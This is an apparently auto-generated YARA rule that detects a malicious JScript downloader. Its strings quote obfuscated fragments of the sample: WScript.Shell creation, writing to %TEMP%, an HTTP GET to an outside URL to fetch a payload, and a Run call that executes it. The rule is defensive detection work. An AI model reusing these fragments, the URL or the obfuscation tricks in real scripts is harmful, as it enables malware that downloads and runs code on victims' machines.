rule sig_20160427_9d19b5570c1a9f1485bafb542d7c9d1f {
  meta:
    description = "datamaliciousorder - file 20160427_9d19b5570c1a9f1485bafb542d7c9d1f.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "37070ea6a410149a8148d2b15720aa0481c2287b5eeccba05c68418eba72da07"

  strings:
    $s1  = "function XfgkeYqxny() {return ArsjfIcoir[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"JTwBNBk" ascii
    $s2  = "function XfgkeYqxny() {return ArsjfIcoir[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"JTwBNBk" ascii
    $s3  = "function AbieuXrbhc(ZidepBnvmy, XlremXubxy){AytrhLxqut = AytrhLxqut * 1; return ZidepBnvmy - XlremXubxy;};" fullword ascii
    $s4  = "JlbhzKeegx[TlaqgNkgko](\"G\" + \"ET\", \"http://lbbc.pt/n8wisd\", false);" fullword ascii
    $s5  = "var NlviaPotqo = this[\"WScript\"];" fullword ascii
    $s6  = "function NlvfmRlqnf(){return JwpelTjjqv + \"\";};" fullword ascii
    $s7  = "var ArsjfIcoir = function RoccdGxuqd() {return NlviaPotqo[CmufaAxhov](\"WScript\"+\".Shell\");}(), KcaanLhzrm = 11;" fullword ascii
    $s8  = "if (JlbhzKeegx[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s9  = "function LjuoqTnffm() {return ((NozvnRoqqu == true) && (NozvnRoqqu == DlubuAzmkz)) ? 1 : AytrhLxqut;};" fullword ascii
    $s10 = "var NozvnRoqqu = false;" fullword ascii
    $s11 = "}while (ZeviyOyfrr);" fullword ascii
    $s12 = "DlubuAzmkz = true; " fullword ascii
    $s13 = "NozvnRoqqu = true; " fullword ascii
    $s14 = "function CqfmaVwpaq(){return CmufaAxhov;};" fullword ascii
    $s15 = "return AbieuXrbhc(CoepvWmcjv, NjctpOydlh);" fullword ascii
    $s16 = "function JfignJfffl(HccnxGmflq) {var UawurIhslw = (1, 2, 3, 4, 5, HccnxGmflq); return UawurIhslw;};" fullword ascii
    $s17 = "var VuagbOefkd = new this[\"D\"+\"ate\"]();" fullword ascii
    $s18 = "function PsthmTfdhg(JyulsBnhym){ArsjfIcoir[\"R\"+\"un\"](JyulsBnhym, AytrhLxqut, AytrhLxqut);};" fullword ascii
    $s19 = "var DlubuAzmkz = false;" fullword ascii
    $s20 = "function KkchsFjadv(){return 23;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}